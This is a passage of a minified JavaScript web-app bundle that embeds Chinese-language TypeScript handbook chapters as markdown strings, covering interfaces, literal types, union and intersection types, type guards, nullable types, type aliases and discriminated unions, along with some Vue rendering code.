除了描述带有属性的普通对象外，接口也可以描述函数类型。\n\n为了使用接口表示函数类型，我们需要给接口定义一个调用签名。 它就像是一个只有参数列表和返回值类型的函数定义。参数列表里的每个参数都需要名字和类型。\n\n```typescript\ninterface SearchFunc {\n  (source: string, subString: string): boolean;\n}\n```\n\n这样定义后，我们可以像使用其它接口一样使用这个函数类型的接口。 下例展示了如何创建一个函数类型的变量，并将一个同类型的函数赋值给这个变量。\n\n```typescript\nlet mySearch: SearchFunc;\nmySearch = function(source: string, subString: string) {\n  let result = source.search(subString);\n  return result > -1;\n};\n```\n\n对于函数类型的类型检查来说，函数的参数名不需要与接口里定义的名字相匹配。 比如，我们使用下面的代码重写上面的例子：\n\n```typescript\nlet mySearch: SearchFunc;\nmySearch = function(src: string, sub: string): boolean {\n  let result = src.search(sub);\n  return result > -1;\n};\n```\n\n函数的参数会逐个进行检查，要求对应位置上的参数类型是兼容的。 如果你不想指定类型，TypeScript 的类型系统会推断出参数类型，因为函数直接赋值给了`SearchFunc`类型变量。 函数的返回值类型是通过其返回值推断出来的（此例是`false`和`true`）。\n\n```typescript\nlet mySearch: SearchFunc;\nmySearch = function(src, sub) {\n  let result = src.search(sub);\n  return result > -1;\n};\n```\n\n如果让这个函数返回数字或字符串，类型检查器会警告我们函数的返回值类型与`SearchFunc`接口中的定义不匹配。\n\n```typescript\nlet mySearch: SearchFunc;\n\n// error: Type \'(src: string, sub: string) => string\' is not assignable to type \'SearchFunc\'.\n// Type \'string\' is not assignable to type \'boolean\'.\nmySearch = function(src, sub) {\n  let result = src.search(sub);\n  return "string";\n};\n```\n\n## 可索引的类型\n\n与使用接口描述函数类型差不多，我们也可以描述那些能够“通过索引得到”的类型，比如`a[10]`或`ageMap["daniel"]`。 可索引类型具有一个_索引签名_，它描述了对象索引的类型，还有相应的索引返回值类型。 让我们看一个例子：\n\n```typescript\ninterface StringArray {\n  [index: number]: string;\n}\n\nlet myArray: StringArray;\nmyArray = ["Bob", "Fred"];\n\nlet myStr: string = myArray[0];\n```\n\n上面例子里，我们定义了`StringArray`接口，它具有索引签名。 这个索引签名表示了当用`number`去索引`StringArray`时会得到`string`类型的返回值。\n\nTypescript 支持两种索引签名：字符串和数字。 可以同时使用两种类型的索引，但是数字索引的返回值必须是字符串索引返回值类型的子类型。 这是因为当使用`number`来索引时，JavaScript 会将它转换成`string`然后再去索引对象。 也就是说用`100`（一个`number`）去索引等同于使用`"100"`（一个`string`）去索引，因此两者需要保持一致。\n\n```typescript\nclass Animal {\n  name: string;\n}\nclass Dog extends Animal {\n  breed: string;\n}\n\n// 错误：使用数值型的字符串索引，有时会得到完全不同的Animal!\ninterface NotOkay {\n  [x: number]: Animal;\n  [x: string]: Dog;\n}\n```\n\n字符串索引签名能够很好的描述`dictionary`模式，并且它们也会确保所有属性与其返回值类型相匹配。 因为字符串索引声明了`obj.property`和`obj["property"]`两种形式都可以。 下面的例子里，`name`的类型与字符串索引类型不匹配，所以类型检查器给出一个错误提示：\n\n```typescript\ninterface NumberDictionary {\n  [index: string]: number;\n  length: number; // 可以，length是number类型\n  name: string; // 错误，`name`的类型与索引类型返回值的类型不匹配\n}\n```\n\n但如果索引签名是包含属性类型的联合类型，那么使用不同类型的属性就是允许的。\n\n```typescript\ninterface NumberOrStringDictionary {\n   [index: string]: number | string;\n   length: number;    // ok, length is a number\n   name: string;      // ok, name is a string\n}\n```\n\n最后，你可以将索引签名设置为只读，这样就防止了给索引赋值：\n\n```typescript\ninterface ReadonlyStringArray {\n  readonly [index: number]: string;\n}\nlet myArray: ReadonlyStringArray = ["Alice", "Bob"];\nmyArray[2] = "Mallory"; // error!\n```\n\n你不能设置`myArray[2]`，因为索引签名是只读的。\n\n## 类类型\n\n### 实现接口\n\n与 C\\#或 Java 里接口的基本作用一样，TypeScript 也能够用它来明确的强制一个类去符合某种契约。\n\n```typescript\ninterface ClockInterface {\n  currentTime: Date;\n}\n\nclass Clock implements ClockInterface {\n  currentTime: Date = new Date();\n  constructor(h: number, m: number) {}\n}\n```\n\n你也可以在接口中描述一个方法，在类里实现它，如同下面的`setTime`方法一样：\n\n```typescript\ninterface ClockInterface {\n  currentTime: Date;\n  setTime(d: Date): void;\n}\n\nclass Clock implements ClockInterface {\n  currentTime: Date = new Date();\n  setTime(d: Date) {\n    this.currentTime = d;\n  }\n  constructor(h: number, m: number) {}\n}\n```\n\n接口描述了类的公共部分，而不是公共和私有两部分。 它不会帮你检查类是否具有某些私有成员。\n\n### 类静态部分与实例部分的区别\n\n当你操作类和接口的时候，你要知道类是具有两个类型的：静态部分的类型和实例的类型。 你会注意到，当你用构造器签名去定义一个接口并试图定义一个类去实现这个接口时会得到一个错误：\n\n```typescript\ninterface ClockConstructor {\n  new (hour: number, minute: number);\n}\n\nclass Clock implements ClockConstructor {\n  currentTime: Date;\n  constructor(h: number, m: number) {}\n}\n```\n\n这里因为当一个类实现了一个接口时，只对其实例部分进行类型检查。 constructor 存在于类的静态部分，所以不在检查的范围内。\n\n因此，我们应该直接操作类的静态部分。 看下面的例子，我们定义了两个接口，`ClockConstructor`为构造函数所用和`ClockInterface`为实例方法所用。 为了方便我们定义一个构造函数`createClock`，它用传入的类型创建实例。\n\n```typescript\ninterface ClockConstructor {\n  new (hour: number, minute: number): ClockInterface;\n}\ninterface ClockInterface {\n  tick(): void;\n}\n\nfunction createClock(\n  ctor: ClockConstructor,\n  hour: number,\n  minute: number\n): ClockInterface {\n  return new ctor(hour, minute);\n}\n\nclass DigitalClock implements ClockInterface {\n  constructor(h: number, m: number) {}\n  tick() {\n    console.log("beep beep");\n  }\n}\nclass AnalogClock implements ClockInterface {\n  constructor(h: number, m: number) {}\n  tick() {\n    console.log("tick tock");\n  }\n}\n\nlet digital = createClock(DigitalClock, 12, 17);\nlet analog = createClock(AnalogClock, 7, 32);\n```\n\n因为`createClock`的第一个参数是`ClockConstructor`类型，在`createClock(AnalogClock, 7, 32)`里，会检查`AnalogClock`是否符合构造函数签名。\n\n另一种简单方式是使用类表达式：\n\n```typescript\ninterface ClockConstructor {\n  new (hour: number, minute: number);\n}\n\ninterface ClockInterface {\n  tick();\n}\n\nconst Clock: ClockConstructor = class Clock implements ClockInterface {\n  constructor(h: number, m: number) {}\n  tick() {\n    console.log("beep beep");\n  }\n};\n```\n\n## 继承接口\n\n和类一样，接口也可以相互继承。 这让我们能够从一个接口里复制成员到另一个接口里，可以更灵活地将接口分割到可重用的模块里。\n\n```typescript\ninterface Shape {\n  color: string;\n}\n\ninterface Square extends Shape {\n  sideLength: number;\n}\n\nlet square = {} as Square;\nsquare.color = "blue";\nsquare.sideLength = 10;\n```\n\n一个接口可以继承多个接口，创建出多个接口的合成接口。\n\n```typescript\ninterface Shape {\n  color: string;\n}\n\ninterface PenStroke {\n  penWidth: number;\n}\n\ninterface Square extends Shape, PenStroke {\n  sideLength: number;\n}\n\nlet square = {} as Square;\nsquare.color = "blue";\nsquare.sideLength = 10;\nsquare.penWidth = 5.0;\n```\n\n## 混合类型\n\n先前我们提过，接口能够描述 JavaScript 里丰富的类型。 因为 JavaScript 其动态灵活的特点，有时你会希望一个对象可以同时具有上面提到的多种类型。\n\n一个例子就是，一个对象可以同时做为函数和对象使用，并带有额外的属性。\n\n```typescript\ninterface Counter {\n  (start: number): string;\n  interval: number;\n  reset(): void;\n}\n\nfunction getCounter(): Counter {\n  let counter = function(start: number) {} as Counter;\n  counter.interval = 123;\n  counter.reset = function() {};\n  return counter;\n}\n\nlet c = getCounter();\nc(10);\nc.reset();\nc.interval = 5.0;\n```\n\n在使用 JavaScript 第三方库的时候，你可能需要像上面那样去完整地定义类型。\n\n## 接口继承类\n\n当接口继承了一个类类型时，它会继承类的成员但不包括其实现。 就好像接口声明了所有类中存在的成员，但并没有提供具体实现一样。 接口同样会继承到类的 private 和 protected 成员。 这意味着当你创建了一个接口继承了一个拥有私有或受保护的成员的类时，这个接口类型只能被这个类或其子类所实现（implement）。\n\n当你有一个庞大的继承结构时这很有用，但要指出的是你的代码只在子类拥有特定属性时起作用。 除了继承自基类，子类之间不必相关联。 例：\n\n```typescript\nclass Control {\n  private state: any;\n}\n\ninterface SelectableControl extends Control {\n  select(): void;\n}\n\nclass Button extends Control implements SelectableControl {\n  select() {}\n}\n\nclass TextBox extends Control {\n  select() {}\n}\n\nclass ImageControl implements SelectableControl {\n// Error: Class \'ImageControl\' incorrectly implements interface \'SelectableControl\'.\n//  Types have separate declarations of a private property \'state\'.\n  private state: any;\n  select() {}\n}\n```\n\n在上面的例子里，`SelectableControl`包含了`Control`的所有成员，包括私有成员`state`。 因为`state`是私有成员，所以只能够是`Control`的子类们才能实现`SelectableControl`接口。 因为只有`Control`的子类才能够拥有一个声明于`Control`的私有成员`state`，这对私有成员的兼容性是必需的。\n\n在`Control`类内部，是允许通过`SelectableControl`的实例来访问私有成员`state`的。 实际上，`SelectableControl`就像`Control`一样，并拥有一个`select`方法。 `Button`和`TextBox`类是`SelectableControl`的子类（因为它们都继承自`Control`并有`select`方法）。而对于 `ImageControl` 类，它有自身的私有成员 `state` 而不是通过继承 `Control` 得来的，所以它不可以实现 `SelectableControl` 。\n\n',ul='# 字面量类型\n\n## 介绍\n\n一个字面量是一个集体类型中更为具体的一种子类型。意思是：`"Hello World"` 是一个 `string`，但是一个 `string` 不是类型系统中的 `"Hello World"`。\n\n目前 TypeScript 中有三种可用的字面量类型集合，分别是：字符串、数字和布尔值。通过使用字面量类型，你可以规定一个字符串、数字或布尔值必须含有的确定值。\n\n## 字面量收窄\n\n当你通过 `var` 或 `let` 来声明一个变量时，实际上你在告诉编译器这个变量中的内容有可能会被改变。与之相对地，用 `const` 来声明对象会让 TypeScript 知道这个对象永远不会被改变。\n\n```TypeScript\n// We\'re making a guarantee that this variable\n// helloWorld will never change, by using const.\n\n// So, TypeScript sets the type to be "Hello World" not string\nconst helloWorld = "Hello World";\n\n// On the other hand, a let can change, and so the compiler declares it a string\nlet hiWorld = "Hi World";\n```\n\n从无穷多种可能的例子（`string` 变量的值有无穷多种）到一个更小、确定数量的例子（在上述例子中，`"Hello Wrold"` 的可能值只有一种）的过程就叫收窄。\n\n## 字符串字面量类型\n\n字面量类型可以通过联合联系、类型守卫、类型别名来结合实际字符串值。通过这些特性，我们可以获取一种字符串并使其有类似枚举（enum）的行为。\n\n```TypeScript\ntype Easing = "ease-in" | "ease-out" | "ease-in-out";\n\nclass UIElement {\n  animate(dx: number, dy: number, easing: Easing) {\n    if (easing === "ease-in") {\n      // ...\n    } else if (easing === "ease-out") {\n    } else if (easing === "ease-in-out") {\n    } else {\n      // It\'s possible that someone could reach this\n      // by ignoring your types though.\n    }\n  }\n}\n\nlet button = new UIElement();\nbutton.animate(0, 0, "ease-in");\nbutton.animate(0, 0, "uneasy");\n// Error: Argument of type \'"uneasy"\' is not assignable to parameter of type \'Easing\'.\n```\n\n你可以传递三种允许的字符串，但是如果传递其他的字符串会收到如下错误：\n\n```TypeScript\nArgument of type \'"uneasy"\' is not assignable to parameter of type \'"ease-in" | "ease-out" | "ease-in-out"\'\n```\n\n字符串字面可以通过相同的方式用来分别重载：\n\n```TypeScript\nfunction createElement(tagName: "img"): HTMLImageElement;\nfunction createElement(tagName: "input"): HTMLInputElement;\n// ... more overloads ...\nfunction createElement(tagName: string): Element {\n  // ... code goes here ...\n}\n```\n\n## 数字字面量类型\n\nTypeScript 还有数字字面量类型，它的行为和上述字符串字面量类型相同。\n\n```TypeScript\nfunction rollDice(): 1 | 2 | 3 | 4 | 5 | 6 {\n  return (Math.floor(Math.random() * 6) + 1) as 1 | 2 | 3 | 4 | 5 | 6;\n}\n\nconst result = rollDice();\n```\n\n数字字面量类型经常用来描述配置值：\n\n```TypeScript\ninterface MapConfig {\n  lng: number;\n  lat: number;\n  tileSize: 8 | 16 | 32;\n}\n\nsetupMap({ lng: -73.935242, lat: 40.73061, tileSize: 16 });\n```\n\n## 布尔字面量类型\n\nTypeScript 还有布尔值字面量类型，你可以通过他们来约束某些属性之间互有关联的对象。\n\n```TypeScript\ninterface ValidationSuccess {\n  isValid: true;\n  reason: null;\n};\n\ninterface ValidationFailure {\n  isValid: false;\n  reason: string;\n};\n\ntype ValidationResult =\n  | ValidationSuccess\n  | ValidationFailure;\n```\n\n',ml={data:function(){return{MainComponent1:il,MainComponent2:sl,MainComponent3:ol,MainComponent4:ll,MainComponent5:cl,MainComponent6:pl,MainComponent7:ul}}},dl=ml,gl=Object(u["a"])(dl,el,al,!1,null,"6c441751",null),bl=gl.exports,vl=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent1}}),t("q-markdown",{attrs:{src:n.MainComponent2}}),t("q-markdown",{attrs:{src:n.MainComponent3}}),t("q-markdown",{attrs:{src:n.MainComponent4}}),t("q-markdown",{attrs:{src:n.MainComponent5}}),t("q-markdown",{attrs:{src:n.MainComponent6}}),t("q-markdown",{attrs:{src:n.MainComponent7}}),t("q-markdown",{attrs:{src:n.MainComponent8}}),t("q-markdown",{attrs:{src:n.MainComponent9}}),t("q-markdown",{attrs:{src:n.MainComponent10}}),t("q-markdown",{attrs:{src:n.MainComponent11}}),t("q-markdown",{attrs:{src:n.MainComponent12}}),t("q-markdown",{attrs:{src:n.MainComponent13}}),t("q-markdown",{attrs:{src:n.MainComponent14}}),t("q-markdown",{attrs:{src:n.MainComponent15}}),t("q-markdown",{attrs:{src:n.MainComponent16}})],1)},hl=[],Sl='# 高级类型\n\n## 交叉类型（Intersection Types）\n\n交叉类型是将多个类型合并为一个类型。 这让我们可以把现有的多种类型叠加到一起成为一种类型，它包含了所需的所有类型的特性。 例如，`Person & Serializable & Loggable`同时是`Person`_和_`Serializable`_和_`Loggable`。 就是说这个类型的对象同时拥有了这三种类型的成员。\n\n我们大多是在混入（mixins）或其它不适合典型面向对象模型的地方看到交叉类型的使用。 （在JavaScript里发生这种情况的场合很多！） 下面是如何创建混入的一个简单例子\\("target": "es5"\\)：\n\n```typescript\nfunction extend<First, Second>(first: First, second: Second): First & Second {\n    const result: Partial<First & Second> = {};\n    for (const prop in first) {\n        if (first.hasOwnProperty(prop)) {\n            (result as First)[prop] = first[prop];\n        }\n    }\n    for (const prop in second) {\n        if (second.hasOwnProperty(prop)) {\n            (result as Second)[prop] = second[prop];\n        }\n    }\n    return result as First & Second;\n}\n\nclass Person {\n    constructor(public name: string) { }\n}\n\ninterface Loggable {\n    log(name: string): void;\n}\n\nclass ConsoleLogger implements Loggable {\n    log(name) {\n        console.log(`Hello, I\'m ${name}.`);\n    }\n}\n\nconst jim = extend(new Person(\'Jim\'), ConsoleLogger.prototype);\njim.log(jim.name);\n```\n\n## 联合类型（Union Types）\n\n联合类型与交叉类型很有关联，但是使用上却完全不同。 偶尔你会遇到这种情况，一个代码库希望传入`number`或`string`类型的参数。 例如下面的函数：\n\n```typescript\n/**\n * Takes a string and adds "padding" to the left.\n * If \'padding\' is a string, then \'padding\' is appended to the left side.\n * If \'padding\' is a number, then that number of spaces is added to the left side.\n */\nfunction padLeft(value: string, padding: any) {\n    if (typeof padding === "number") {\n        return Array(padding + 1).join(" ") + value;\n    }\n    if (typeof padding === "string") {\n        return padding + value;\n    }\n    throw new Error(`Expected string or number, got \'${padding}\'.`);\n}\n\npadLeft("Hello world", 4); // returns "    Hello world"\n```\n\n`padLeft`存在一个问题，`padding`参数的类型指定成了`any`。 这就是说我们可以传入一个既不是`number`也不是`string`类型的参数，但是TypeScript却不报错。\n\n```typescript\nlet indentedString = padLeft("Hello world", true); // 编译阶段通过，运行时报错\n```\n\n在传统的面向对象语言里，我们可能会将这两种类型抽象成有层级的类型。 这么做显然是非常清晰的，但同时也存在了过度设计。 `padLeft`原始版本的好处之一是允许我们传入原始类型。 这样做的话使用起来既简单又方便。 如果我们就是想使用已经存在的函数的话，这种新的方式就不适用了。\n\n代替`any`， 我们可以使用_联合类型_做为`padding`的参数：\n\n```typescript\n/**\n * Takes a string and adds "padding" to the left.\n * If \'padding\' is a string, then \'padding\' is appended to the left side.\n * If \'padding\' is a number, then that number of spaces is added to the left side.\n */\nfunction padLeft(value: string, padding: string | number) {\n    // ...\n}\n\nlet indentedString = padLeft("Hello world", true); // errors during compilation\n```\n\n联合类型表示一个值可以是几种类型之一。 我们用竖线（`|`）分隔每个类型，所以`number | string | boolean`表示一个值可以是`number`，`string`，或`boolean`。\n\n如果一个值是联合类型，我们只能访问此联合类型的所有类型里共有的成员。\n\n```typescript\ninterface Bird {\n    fly();\n    layEggs();\n}\n\ninterface Fish {\n    swim();\n    layEggs();\n}\n\nfunction getSmallPet(): Fish | Bird {\n    // ...\n}\n\nlet pet = getSmallPet();\npet.layEggs(); // okay\npet.swim();    // errors\n```\n\n这里的联合类型可能有点复杂，但是你很容易就习惯了。 如果一个值的类型是`A | B`，我们能够_确定_的是它包含了`A`_和_`B`中共有的成员。 这个例子里，`Bird`具有一个`fly`成员。 我们不能确定一个`Bird | Fish`类型的变量是否有`fly`方法。 如果变量在运行时是`Fish`类型，那么调用`pet.fly()`就出错了。\n\n## 类型守卫与类型区分（Type Guards and Differentiating Types）\n\n联合类型适合于那些值可以为不同类型的情况。 但当我们想确切地了解是否为`Fish`时怎么办？ JavaScript里常用来区分2个可能值的方法是检查成员是否存在。 如之前提及的，我们只能访问联合类型中共同拥有的成员。\n\n```typescript\nlet pet = getSmallPet();\n\n// 每一个成员访问都会报错\nif (pet.swim) {\n    pet.swim();\n}\nelse if (pet.fly) {\n    pet.fly();\n}\n```\n\n为了让这段代码工作，我们要使用类型断言：\n\n```typescript\nlet pet = getSmallPet();\n\nif ((pet as Fish).swim) {\n    (pet as Fish).swim();\n} else if ((pet as Bird).fly) {\n    (pet as Bird).fly();\n}\n```\n\n### 用户自定义的类型守卫\n\n这里可以注意到我们不得不多次使用类型断言。 假若我们一旦检查过类型，就能在之后的每个分支里清楚地知道`pet`的类型的话就好了。\n\nTypeScript里的_类型守卫_机制让它成为了现实。 类型守卫就是一些表达式，它们会在运行时检查以确保在某个作用域里的类型。\n\n#### 使用类型判定\n\n要定义一个类型守卫，我们只要简单地定义一个函数，它的返回值是一个_类型谓词_：\n\n```typescript\nfunction isFish(pet: Fish | Bird): pet is Fish {\n    return (pet as Fish).swim !== undefined;\n}\n```\n\n在这个例子里，`pet is Fish`就是类型谓词。 谓词为`parameterName is Type`这种形式，`parameterName`必须是来自于当前函数签名里的一个参数名。\n\n每当使用一些变量调用`isFish`时，TypeScript会将变量缩减为那个具体的类型，只要这个类型与变量的原始类型是兼容的。\n\n```typescript\n// \'swim\' 和 \'fly\' 调用都没有问题了\n\nif (isFish(pet)) {\n    pet.swim();\n}\nelse {\n    pet.fly();\n}\n```\n\n注意TypeScript不仅知道在`if`分支里`pet`是`Fish`类型； 它还清楚在`else`分支里，一定_不是_`Fish`类型，一定是`Bird`类型。\n\n#### 使用`in`操作符\n\n`in`操作符可以作为类型细化表达式来使用。\n\n对于`n in x`表达式，其中`n`是字符串字面量或字符串字面量类型且`x`是个联合类型，那么`true`分支的类型细化为有一个可选的或必须的属性`n`，`false`分支的类型细化为有一个可选的或不存在属性`n`。\n\n```typescript\nfunction move(pet: Fish | Bird) {\n    if ("swim" in pet) {\n        return pet.swim();\n    }\n    return pet.fly();\n}\n```\n\n### `typeof`类型守卫\n\n现在我们回过头来看看怎么使用联合类型书写`padLeft`代码。 我们可以像下面这样利用类型断言来写：\n\n```typescript\nfunction isNumber(x: any): x is number {\n    return typeof x === "number";\n}\n\nfunction isString(x: any): x is string {\n    return typeof x === "string";\n}\n\nfunction padLeft(value: string, padding: string | number) {\n    if (isNumber(padding)) {\n        return Array(padding + 1).join(" ") + value;\n    }\n    if (isString(padding)) {\n        return padding + value;\n    }\n    throw new Error(`Expected string or number, got \'${padding}\'.`);\n}\n```\n\n然而，必须要定义一个函数来判断类型是否是原始类型，这太痛苦了。 幸运的是，现在我们不必将`typeof x === "number"`抽象成一个函数，因为TypeScript可以将它识别为一个类型守卫。 也就是说我们可以直接在代码里检查类型了。\n\n```typescript\nfunction padLeft(value: string, padding: string | number) {\n    if (typeof padding === "number") {\n        return Array(padding + 1).join(" ") + value;\n    }\n    if (typeof padding === "string") {\n        return padding + value;\n    }\n    throw new Error(`Expected string or number, got \'${padding}\'.`);\n}\n```\n\n这些_`typeof`类型守卫_只有两种形式能被识别：`typeof v === "typename"`和`typeof v !== "typename"`，`"typename"`必须是`"number"`，`"string"`，`"boolean"`或`"symbol"`。 但是TypeScript并不会阻止你与其它字符串比较，语言不会把那些表达式识别为类型守卫。\n\n### `instanceof`类型守卫\n\n如果你已经阅读了`typeof`类型守卫并且对JavaScript里的`instanceof`操作符熟悉的话，你可能已经猜到了这节要讲的内容。\n\n_`instanceof`类型守卫_是通过构造函数来细化类型的一种方式。 比如，我们借鉴一下之前字符串填充的例子：\n\n```typescript\ninterface Padder {\n    getPaddingString(): string\n}\n\nclass SpaceRepeatingPadder implements Padder {\n    constructor(private numSpaces: number) { }\n    getPaddingString() {\n        return Array(this.numSpaces + 1).join(" ");\n    }\n}\n\nclass StringPadder implements Padder {\n    constructor(private value: string) { }\n    getPaddingString() {\n        return this.value;\n    }\n}\n\nfunction getRandomPadder() {\n    return Math.random() < 0.5 ?\n        new SpaceRepeatingPadder(4) :\n        new StringPadder("  ");\n}\n\n// 类型为SpaceRepeatingPadder | StringPadder\nlet padder: Padder = getRandomPadder();\n\nif (padder instanceof SpaceRepeatingPadder) {\n    padder; // 类型细化为\'SpaceRepeatingPadder\'\n}\nif (padder instanceof StringPadder) {\n    padder; // 类型细化为\'StringPadder\'\n}\n```\n\n`instanceof`的右侧要求是一个构造函数，TypeScript将细化为：\n\n1. 此构造函数的`prototype`属性的类型，如果它的类型不为`any`的话\n2. 构造签名所返回的类型的联合\n\n以此顺序。\n\n## 可以为`null`的类型\n\nTypeScript具有两种特殊的类型，`null`和`undefined`，它们分别具有值`null`和`undefined`. 我们在[基础类型](basic-types.md)一节里已经做过简要说明。 默认情况下，类型检查器认为`null`与`undefined`可以赋值给任何类型。 `null`与`undefined`是所有其它类型的一个有效值。 这也意味着，你阻止不了将它们赋值给其它类型，就算是你想要阻止这种情况也不行。 `null`的发明者，Tony Hoare，称它为[价值亿万美金的错误](https://en.wikipedia.org/wiki/Null_pointer#History)。\n\n`--strictNullChecks`标记可以解决此错误：当你声明一个变量时，它不会自动地包含`null`或`undefined`。 你可以使用联合类型明确的包含它们：\n\n```typescript\nlet s = "foo";\ns = null; // 错误, \'null\'不能赋值给\'string\'\nlet sn: string | null = "bar";\nsn = null; // 可以\n\nsn = undefined; // error, \'undefined\'不能赋值给\'string | null\'\n```\n\n注意，按照JavaScript的语义，TypeScript会把`null`和`undefined`区别对待。 `string | null`，`string | undefined`和`string | undefined | null`是不同的类型。\n\n### 可选参数和可选属性\n\n使用了`--strictNullChecks`，可选参数会被自动地加上`| undefined`:\n\n```typescript\nfunction f(x: number, y?: number) {\n    return x + (y || 0);\n}\nf(1, 2);\nf(1);\nf(1, undefined);\nf(1, null); // error, \'null\' is not assignable to \'number | undefined\'\n```\n\n可选属性也会有同样的处理：\n\n```typescript\nclass C {\n    a: number;\n    b?: number;\n}\nlet c = new C();\nc.a = 12;\nc.a = undefined; // error, \'undefined\' is not assignable to \'number\'\nc.b = 13;\nc.b = undefined; // ok\nc.b = null; // error, \'null\' is not assignable to \'number | undefined\'\n```\n\n### 类型守卫和类型断言\n\n由于可以为`null`的类型是通过联合类型实现，那么你需要使用类型守卫来去除`null`。 幸运地是这与在JavaScript里写的代码一致：\n\n```typescript\nfunction f(sn: string | null): string {\n    if (sn == null) {\n        return "default";\n    }\n    else {\n        return sn;\n    }\n}\n```\n\n这里很明显地去除了`null`，你也可以使用短路运算符：\n\n```typescript\nfunction f(sn: string | null): string {\n    return sn || "default";\n}\n```\n\n如果编译器不能够去除`null`或`undefined`，你可以使用类型断言手动去除。 语法是添加`!`后缀：`identifier!`从`identifier`的类型里去除了`null`和`undefined`：\n\n```typescript\nfunction broken(name: string | null): string {\n  function postfix(epithet: string) {\n    return name.charAt(0) + \'.  the \' + epithet; // error, \'name\' is possibly null\n  }\n  name = name || "Bob";\n  return postfix("great");\n}\n\nfunction fixed(name: string | null): string {\n  function postfix(epithet: string) {\n    return name!.charAt(0) + \'.  the \' + epithet; // ok\n  }\n  name = name || "Bob";\n  return postfix("great");\n}\n```\n\n本例使用了嵌套函数，因为编译器无法去除嵌套函数的`null`（除非是立即调用的函数表达式）。 因为它无法跟踪所有对嵌套函数的调用，尤其是你将内层函数做为外层函数的返回值。 如果无法知道函数在哪里被调用，就无法知道调用时`name`的类型。\n\n## 类型别名\n\n类型别名会给一个类型起个新名字。 类型别名有时和接口很像，但是可以作用于原始值，联合类型，元组以及其它任何你需要手写的类型。\n\n```typescript\ntype Name = string;\ntype NameResolver = () => string;\ntype NameOrResolver = Name | NameResolver;\nfunction getName(n: NameOrResolver): Name {\n    if (typeof n === \'string\') {\n        return n;\n    }\n    else {\n        return n();\n    }\n}\n```\n\n起别名不会新建一个类型 - 它创建了一个新_名字_来引用那个类型。 给原始类型起别名通常没什么用，尽管可以做为文档的一种形式使用。\n\n同接口一样，类型别名也可以是泛型 - 我们可以添加类型参数并且在别名声明的右侧传入：\n\n```typescript\ntype Container<T> = { value: T };\n```\n\n我们也可以使用类型别名来在属性里引用自己：\n\n```typescript\ntype Tree<T> = {\n    value: T;\n    left: Tree<T>;\n    right: Tree<T>;\n}\n```\n\n与交叉类型一起使用，我们可以创建出一些十分稀奇古怪的类型。\n\n```typescript\ntype LinkedList<T> = T & { next: LinkedList<T> };\n\ninterface Person {\n    name: string;\n}\n\nvar people: LinkedList<Person>;\nvar s = people.name;\nvar s = people.next.name;\nvar s = people.next.next.name;\nvar s = people.next.next.next.name;\n```\n\n然而，类型别名不能出现在声明右侧的任何地方。\n\n```typescript\ntype Yikes = Array<Yikes>; // error\n```\n\n### 接口 vs. 类型别名\n\n像我们提到的，类型别名可以像接口一样；然而，仍有一些细微差别。\n\n其一，接口创建了一个新的名字，可以在其它任何地方使用。 类型别名并不创建新名字—比如，错误信息就不会使用别名。 在下面的示例代码里，在编译器中将鼠标悬停在`interfaced`上，显示它返回的是`Interface`，但悬停在`aliased`上时，显示的却是对象字面量类型。\n\n```typescript\ntype Alias = { num: number }\ninterface Interface {\n    num: number;\n}\ndeclare function aliased(arg: Alias): Alias;\ndeclare function interfaced(arg: Interface): Interface;\n```\n\n在旧版本的TypeScript里，类型别名不能被继承和实现（它们也不能继承和实现其它类型）。从TypeScript 2.7开始，类型别名可以被继承并生成新的交叉类型。例如：`type Cat = Animal & { purrs: true }`。\n\n因为[软件中的对象应该对于扩展是开放的，但是对于修改是封闭的](https://en.wikipedia.org/wiki/Open/closed_principle)，你应该尽量去使用接口代替类型别名。\n\n另一方面，如果你无法通过接口来描述一个类型并且需要使用联合类型或元组类型，这时通常会使用类型别名。\n\n## 字符串字面量类型\n\n字符串字面量类型允许你指定字符串必须的固定值。 在实际应用中，字符串字面量类型可以与联合类型，类型守卫和类型别名很好的配合。 通过结合使用这些特性，你可以实现类似枚举类型的字符串。\n\n```typescript\ntype Easing = "ease-in" | "ease-out" | "ease-in-out";\nclass UIElement {\n    animate(dx: number, dy: number, easing: Easing) {\n        if (easing === "ease-in") {\n            // ...\n        }\n        else if (easing === "ease-out") {\n        }\n        else if (easing === "ease-in-out") {\n        }\n        else {\n            // error! should not pass null or undefined.\n        }\n    }\n}\n\nlet button = new UIElement();\nbutton.animate(0, 0, "ease-in");\nbutton.animate(0, 0, "uneasy"); // error: "uneasy" is not allowed here\n```\n\n你只能从三种允许的字符中选择其一来做为参数传递，传入其它值则会产生错误。\n\n```text\nArgument of type \'"uneasy"\' is not assignable to parameter of type \'"ease-in" | "ease-out" | "ease-in-out"\'\n```\n\n字符串字面量类型还可以用于区分函数重载：\n\n```typescript\nfunction createElement(tagName: "img"): HTMLImageElement;\nfunction createElement(tagName: "input"): HTMLInputElement;\n// ... more overloads ...\nfunction createElement(tagName: string): Element {\n    // ... code goes here ...\n}\n```\n\n## 数字字面量类型\n\nTypeScript还具有数字字面量类型。\n\n```typescript\nfunction rollDice(): 1 | 2 | 3 | 4 | 5 | 6 {\n    // ...\n}\n```\n\n我们很少直接这样使用，但它们可以用在缩小范围调试bug的时候：\n\n```typescript\nfunction foo(x: number) {\n    if (x !== 1 || x !== 2) {\n        //         ~~~~~~~\n        // Operator \'!==\' cannot be applied to types \'1\' and \'2\'.\n    }\n}\n```\n\n换句话说，当`x`与`2`进行比较的时候，它的值必须为`1`，这就意味着上面的比较检查是非法的。\n\n## 枚举成员类型\n\n如我们在[枚举](enums.md#union-enums-and-enum-member-types)一节里提到的，当每个枚举成员都是用字面量初始化的时候枚举成员是具有类型的。\n\n在我们谈及“单例类型”的时候，多数是指枚举成员类型和数字/字符串字面量类型，尽管大多数用户会互换使用“单例类型”和“字面量类型”。\n\n## 可辨识联合（Discriminated Unions）\n\n你可以合并单例类型，联合类型，类型守卫和类型别名来创建一个叫做_可辨识联合_的高级模式，它也称做_标签联合_或_代数数据类型_。 可辨识联合在函数式编程里很有用处。 一些语言会自动地为你辨识联合；而TypeScript则基于已有的JavaScript模式。 它具有3个要素：\n\n1. 具有普通的单例类型属性—_可辨识的特征_。\n2. 一个类型别名包含了那些类型的联合—_联合_。\n3. 此属性上的类型守卫。\n\n```typescript\ninterface Square {\n    kind: "square";\n    size: number;\n}\ninterface Rectangle {\n    kind: "rectangle";\n    width: number;\n    height: number;\n}\ninterface Circle {\n    kind: "circle";\n    radius: number;\n}\n```\n\n首先我们声明了将要联合的接口。 每个接口都有`kind`属性但有不同的字符串字面量类型。 